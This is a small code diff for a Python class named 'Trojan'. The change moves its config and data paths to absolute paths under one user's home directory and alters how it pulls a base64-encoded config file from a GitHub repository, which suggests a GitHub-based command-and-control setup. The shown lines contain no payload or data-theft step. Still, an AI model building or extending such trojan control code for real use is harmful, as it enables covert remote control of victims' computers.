@@ -22,14 +22,14 @@ def get_file_contents(dirname, module_name, repo):
 class Trojan:
     def __init__(self, id, node_server_url):
         self.id = id
-        self.config_file = f'{id}.json'
-        self.data_path = f'data/{self.id}/'
+        self.config_file = f'/home/hackspark/Trojan/config/{id}.json'
+        self.data_path = f'/home/hackspark/Trojan/data/{id}/'
         self.repo = github_connect()
         self.node_server_url = node_server_url
         self.running = True
 
     def get_github_config(self):
-        config_json = get_file_contents('config', self.config_file, self.repo)
+        config_json = get_file_contents('config', f'{self.id}.json', self.repo)
         return json.loads(base64.b64decode(config_json))
 
     def get_nodejs_config(self):
